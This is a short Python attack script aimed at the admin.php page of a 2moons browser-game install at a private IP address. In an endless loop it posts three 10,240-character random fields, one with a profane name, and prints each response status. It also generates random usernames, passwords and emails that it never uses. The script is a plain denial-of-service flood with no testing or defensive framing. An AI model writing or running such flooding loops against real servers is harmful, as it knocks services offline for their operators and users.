import requests
import random
import time
import string

# http://10.196.1.207/2moons/index.php


def gen(length: int):
    ret = ""
    for _ in range(length//8):
        ret += ''.join(random.sample(string.digits + string.ascii_letters, 8))
    return ret


if __name__ == "__main__":
    random.seed(time.time_ns())
    while (1):
        username = gen(8)
        password = gen(16)
        email = gen(8) + "@" + "qq.com"
        url = "http://10.196.1.207/2moons/admin.php"
        data = {"mode": gen(10240),
                "random_pack": gen(10240),
                "f**k_jljljl": gen(10240)}
        result = requests.post(url=url, data=data)
        print(result.status_code)
